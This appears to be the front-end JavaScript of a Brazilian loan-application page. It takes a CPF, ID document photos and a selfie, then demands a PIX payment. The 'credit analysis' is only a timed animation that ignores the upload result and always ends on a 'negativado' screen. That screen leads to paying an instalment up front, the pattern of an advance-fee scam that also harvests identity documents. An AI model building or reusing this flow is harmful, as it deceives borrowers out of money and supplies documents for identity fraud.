(function () {
  'use strict';

  var state = {
    cpf: '',
    lead: null,
    request: null,
    docType: '',
    photos: { front: null, back: null, selfie: null },
    stream: null,
    pixTransactionId: null,
    pollTimer: null,
    countdownTimer: null,
  };

  var DOC_LABELS = { rg: 'RG', cnh: 'CNH', passaporte: 'Passaporte' };

  var STEPS = [
    'step-cpf', 'step-details', 'step-doctype', 'step-front',
    'step-back', 'step-selfie', 'step-analysis', 'step-negativado', 'step-payment',
  ];

  function $(id) { return document.getElementById(id); }

  function api(path, body) {
    return fetch(window.credpixPath ? window.credpixPath(path) : path, {
      method: body ? 'POST' : 'GET',
      headers: body ? { 'Content-Type': 'application/json' } : {},
      credentials: 'include',
      body: body ? JSON.stringify(body) : undefined,
    }).then(function (r) { return r.json().then(function (d) { return { ok: r.ok, status: r.status, data: d }; }); });
  }

  function showStep(id) {
    STEPS.forEach(function (s) {
      var el = $(s);
      if (el) el.classList.toggle('hidden', s !== id);
    });
    window.scrollTo(0, 0);
  }

  function maskCpf(value) {
    var d = String(value).replace(/\D/g, '').slice(0, 11);
    if (d.length <= 3) return d;
    if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3);
    if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6);
    return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9);
  }

  function isValidCpf(cpf) {
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
    var sum = 0, i, d1, d2;
    for (i = 0; i < 9; i++) sum += Number(cpf[i]) * (10 - i);
    d1 = (sum * 10) % 11;
    if (d1 === 10) d1 = 0;
    if (d1 !== Number(cpf[9])) return false;
    sum = 0;
    for (i = 0; i < 10; i++) sum += Number(cpf[i]) * (11 - i);
    d2 = (sum * 10) % 11;
    if (d2 === 10) d2 = 0;
    return d2 === Number(cpf[10]);
  }

  /* ── CPF step ── */
  var cpfInput = $('cpfInput');
  cpfInput.addEventListener('input', function () {
    cpfInput.value = maskCpf(cpfInput.value);
    $('cpfError').classList.add('hidden');
  });

  $('cpfBtn').addEventListener('click', function () {
    var cpf = cpfInput.value.replace(/\D/g, '');
    var errEl = $('cpfError');
    if (!isValidCpf(cpf)) {
      errEl.textContent = 'Informe um CPF válido.';
      errEl.classList.remove('hidden');
      return;
    }

    var btn = $('cpfBtn');
    btn.disabled = true;
    btn.textContent = 'Buscando...';

    api('/api/kyc/cpf', { cpf: cpf }).then(function (res) {
      btn.disabled = false;
      btn.textContent = 'Continuar';
      if (!res.ok || !res.data.success) {
        errEl.textContent = res.data.message || 'Solicitação não encontrada.';
        errEl.classList.remove('hidden');
        return;
      }
      state.cpf = cpf;
      state.lead = res.data.lead;
      state.request = res.data.request;
      fillDetails();
      showStep('step-details');
    }).catch(function () {
      btn.disabled = false;
      btn.textContent = 'Continuar';
      errEl.textContent = 'Erro de conexão. Tente novamente.';
      errEl.classList.remove('hidden');
    });
  });

  function fillDetails() {
    $('detailNome').textContent = state.lead.nome || '—';
    $('detailCpf').textContent = state.lead.cpf_formatado || maskCpf(state.cpf);
    $('detailValor').textContent = state.request.valor_emprestimo_fmt;
    $('detailParcelas').textContent = state.request.num_parcelas + 'x';
    $('detailParcelaValor').textContent = state.request.parcela_valor_fmt;
    $('detailTotal').textContent = state.request.valor_total_fmt;
    $('negParcela').textContent = state.request.parcela_valor_fmt;
    $('pixAmount').textContent = state.request.parcela_valor_fmt;
  }

  $('detailsBtn').addEventListener('click', function () {
    showStep('step-doctype');
  });

  /* ── Document type ── */
  document.querySelectorAll('[data-doc]').forEach(function (btn) {
    btn.addEventListener('click', function () {
      state.docType = btn.getAttribute('data-doc');
      var label = DOC_LABELS[state.docType] || 'documento';
      $('docLabelFront').textContent = label;
      $('docLabelBack').textContent = label;
      showStep('step-front');
      initCamera('step-front', 'environment');
    });
  });

  /* ── Camera ── */
  function stopStream() {
    if (state.stream) {
      state.stream.getTracks().forEach(function (t) { t.stop(); });
      state.stream = null;
    }
  }

  function initCamera(stepId, facingMode) {
    stopStream();
    var section = $(stepId);
    var wrap = section.querySelector('.camera-wrap');
    var video = wrap.querySelector('.camera-video');
    var preview = wrap.querySelector('.camera-preview');
    var canvas = wrap.querySelector('.camera-canvas');

    video.classList.remove('hidden');
    preview.classList.add('hidden');
    canvas.classList.add('hidden');
    resetCameraActions(section);

    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

    navigator.mediaDevices.getUserMedia({
      video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false,
    }).then(function (stream) {
      state.stream = stream;
      video.srcObject = stream;
      video.play();
    }).catch(function () {
      /* fallback: file upload only */
    });
  }

  function resetCameraActions(section) {
    section.querySelector('.camera-capture').classList.remove('hidden');
    section.querySelector('.camera-retake').classList.add('hidden');
    section.querySelector('.camera-continue').classList.add('hidden');
  }

  function setupCameraStep(stepId, side, nextStepId, facingMode) {
    var section = $(stepId);

    section.querySelector('.camera-capture').addEventListener('click', function () {
      capturePhoto(section, side);
    });

    section.querySelector('.camera-retake').addEventListener('click', function () {
      state.photos[side] = null;
      initCamera(stepId, facingMode);
    });

    section.querySelector('.camera-continue').addEventListener('click', function () {
      stopStream();
      showStep(nextStepId);
      if (nextStepId === 'step-back') {
        initCamera('step-back', 'environment');
      } else if (nextStepId === 'step-selfie') {
        initCamera('step-selfie', 'user');
      } else if (nextStepId === 'step-analysis') {
        submitDocuments();
      }
    });

    var fileInput = section.querySelector('.camera-upload input');
    fileInput.addEventListener('change', function (e) {
      var file = e.target.files && e.target.files[0];
      if (!file) return;
      var reader = new FileReader();
      reader.onload = function (ev) {
        state.photos[side] = ev.target.result;
        showPreview(section, ev.target.result);
      };
      reader.readAsDataURL(file);
    });
  }

  function capturePhoto(section, side) {
    var wrap = section.querySelector('.camera-wrap');
    var video = wrap.querySelector('.camera-video');
    var canvas = wrap.querySelector('.camera-canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    var ctx = canvas.getContext('2d');
    if (side === 'selfie') {
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
    }
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    if (side === 'selfie') ctx.setTransform(1, 0, 0, 1, 0, 0);
    var dataUrl = canvas.toDataURL('image/jpeg', 0.85);
    state.photos[side] = dataUrl;
    stopStream();
    showPreview(section, dataUrl);
  }

  function showPreview(section, dataUrl) {
    var wrap = section.querySelector('.camera-wrap');
    var video = wrap.querySelector('.camera-video');
    var preview = wrap.querySelector('.camera-preview');
    video.classList.add('hidden');
    preview.src = dataUrl;
    preview.classList.remove('hidden');
    section.querySelector('.camera-capture').classList.add('hidden');
    section.querySelector('.camera-retake').classList.remove('hidden');
    section.querySelector('.camera-continue').classList.remove('hidden');
  }

  setupCameraStep('step-front', 'front', 'step-back', 'environment');
  setupCameraStep('step-back', 'back', 'step-selfie', 'environment');
  setupCameraStep('step-selfie', 'selfie', 'step-analysis', 'user');

  /* ── Submit documents ── */
  function submitDocuments() {
    showStep('step-analysis');
    runAnalysisAnimation();

    api('/api/kyc/documents', {
      cpf: state.cpf,
      doc_type: state.docType,
      front_base64: state.photos.front,
      back_base64: state.photos.back,
      selfie_base64: state.photos.selfie,
    }).catch(function () { /* non-blocking */ });
  }

  /* ── Analysis animation ── */
  function runAnalysisAnimation() {
    var steps = document.querySelectorAll('#analysisTimeline .timeline-step');
    var progress = $('analysisProgress');
    var delays = [1800, 2200, 2000, 1800];
    var idx = 0;

    function activate(i) {
      steps.forEach(function (s, j) {
        s.classList.remove('idle', 'active', 'done');
        if (j < i) s.classList.add('done');
        else if (j === i) s.classList.add('active');
        else s.classList.add('idle');
      });
      progress.style.width = (75 + (i + 1) * 6) + '%';
    }

    activate(0);

    function next() {
      idx++;
      if (idx >= steps.length) {
        setTimeout(function () {
          showStep('step-negativado');
        }, 800);
        return;
      }
      activate(idx);
      setTimeout(next, delays[idx] || 1500);
    }

    setTimeout(next, delays[0]);
  }

  /* ── Negativado → Payment ── */
  $('negativadoBtn').addEventListener('click', function () {
    showStep('step-payment');
    generatePix();
  });

  /* ── PIX ── */
  function generatePix() {
    $('pixLoading').classList.remove('hidden');
    $('pixContent').classList.add('hidden');
    $('pixError').classList.add('hidden');

    api('/checkout/api/pix.php?action=generate', {
      step: 'kyc',
      cpf: state.cpf,
      parcela_valor: state.request.parcela_valor,
      name: state.lead.nome,
    }).then(function (res) {
      $('pixLoading').classList.add('hidden');
      if (!res.ok || !res.data.success) {
        $('pixError').textContent = res.data.message || 'Erro ao gerar PIX.';
        $('pixError').classList.remove('hidden');
        return;
      }

      var pix = res.data.pix;
      state.pixTransactionId = pix.transaction_id;

      $('pixQr').src = pix.qr_code_url || ('https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(pix.qr_code));
      $('pixCode').value = pix.qr_code;
      $('pixCodeDisplay').textContent = pix.qr_code;
      $('pixContent').classList.remove('hidden');
      $('pixStatus').classList.remove('hidden');

      startCountdown(30 * 60);
      startPolling();
    }).catch(function () {
      $('pixLoading').classList.add('hidden');
      $('pixError').textContent = 'Erro de conexão ao gerar PIX.';
      $('pixError').classList.remove('hidden');
    });
  }

  function startCountdown(seconds) {
    clearInterval(state.countdownTimer);
    var remaining = seconds;
    var el = $('pixTimer');
    function tick() {
      var m = Math.floor(remaining / 60);
      var s = remaining % 60;
      el.textContent = 'Expira em ' + m + ':' + String(s).padStart(2, '0');
      if (remaining <= 0) {
        clearInterval(state.countdownTimer);
        el.textContent = 'PIX expirado. Recarregue a página.';
        return;
      }
      remaining--;
    }
    tick();
    state.countdownTimer = setInterval(tick, 1000);
  }

  function startPolling() {
    clearInterval(state.pollTimer);
    state.pollTimer = setInterval(function () {
      if (!state.pixTransactionId) return;
      api('/checkout/api/pix.php?action=status', {
        transaction_id: state.pixTransactionId,
      }).then(function (res) {
        if (res.data && res.data.status === 'paid') {
          clearInterval(state.pollTimer);
          $('pixStatus').classList.add('hidden');
          $('pixSuccess').classList.remove('hidden');
          setTimeout(function () {
            window.location.href = window.credpixPath ? window.credpixPath('/comprovante') : '/comprovante';
          }, 2000);
        }
      });
    }, 5000);
  }

  $('pixCopyBtn').addEventListener('click', function () {
    var code = $('pixCode').value;
    if (!code) return;
    navigator.clipboard.writeText(code).then(function () {
      var btn = $('pixCopyBtn');
      btn.textContent = 'Copiado!';
      setTimeout(function () { btn.textContent = 'Copiar código PIX'; }, 2000);
    });
  });

  /* ── Init ── */
  showStep('step-cpf');
})();
